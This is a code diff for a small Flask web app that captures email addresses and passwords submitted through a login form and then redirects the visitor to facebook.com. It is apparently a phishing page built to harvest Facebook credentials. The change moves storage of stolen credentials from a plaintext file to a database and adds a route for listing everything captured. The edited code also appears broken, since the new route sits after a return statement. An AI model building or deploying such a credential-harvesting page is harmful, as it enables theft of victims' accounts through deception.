@@ -1,6 +1,6 @@
 from crypt import methods
 from flask import Flask, render_template, request, redirect, url_for
-import os
+from utils import database
 
 def create_app():
     app = Flask(__name__)
@@ -10,14 +10,14 @@ def create_app():
         if request.method == "POST":
             Email = request.form.get("Email")
             Password = request.form.get("Password")
-            data = {"email":Email, "password":Password}
-            
-            with open("db.txt", "w") as f:
-                f.write("Email: " + Email)
-                f.write("\n")
-                f.write("Password: "+ Password)
-            
-
+            database.create_table()
+            database.add_user(Email, Password)
             return redirect("https://www.facebook.com")
-        return render_template('index.html')
+        
+    return render_template('index.html')
+
+    @app.route('/query')
+    def query():
+        queries = database.query_all()
+        return render_template("query.html", queries=queries)
     return app
